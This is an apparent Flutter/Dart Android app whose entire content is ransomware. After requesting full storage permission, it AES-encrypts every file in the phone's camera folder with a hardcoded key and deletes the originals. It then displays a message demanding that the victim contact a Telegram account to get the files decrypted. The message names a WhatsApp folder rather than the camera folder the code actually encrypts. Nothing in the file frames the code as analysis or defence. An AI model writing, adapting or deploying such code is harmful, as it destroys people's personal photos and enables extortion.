import 'dart:io';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await requestPermissions();
  await encryptAllFilesInFolder();
  runApp(const PlaceholderApp());
}

Future<void> requestPermissions() async {
  var status = await Permission.manageExternalStorage.request();
  if (!status.isGranted) {
    print('Permission not granted!');
  }       
}

Future<void> encryptAllFilesInFolder() async {
  final folderPath = "/storage/emulated/0/DCIM/Camera/";
  final password = "Shivam200@123";

  final key = encrypt.Key.fromUtf8(password.padRight(32, '0')); // AES-256
  final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));
  final directory = Directory(folderPath);

  if (!directory.existsSync()) {
    print("Folder does not exist: $folderPath");
    return;
  }

  final files = directory.listSync();

  for (var entity in files) {
    if (entity is File) {
      try {
        final bytes = entity.readAsBytesSync();

        // ✅ Random IV per file
        final iv = encrypt.IV.fromSecureRandom(16);
        final encrypted = encrypter.encryptBytes(bytes, iv: iv);

        final encryptedFile = File("${entity.path}.enc");

        // ✅ Store IV + encrypted data in file
        final dataToWrite = iv.bytes + encrypted.bytes;
        encryptedFile.writeAsBytesSync(dataToWrite);

        print("Encrypted: ${encryptedFile.path}");

        // ✅ Delete original file
        entity.deleteSync();
        print("Deleted: ${entity.path}");
      } catch (e) {
        print("Error encrypting file ${entity.path}: $e");
      }
    }
  }
}

class PlaceholderApp extends StatelessWidget {
  const PlaceholderApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: Scaffold(
        body: Center(
          child: Text("Your Whatsapp profile phtotos folder is encrypted located in your /internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos, if you want to decrypt then contact on this telegram id --> Cyber_FAIZSHIV "),
        ),
      ),
    );
  }
}
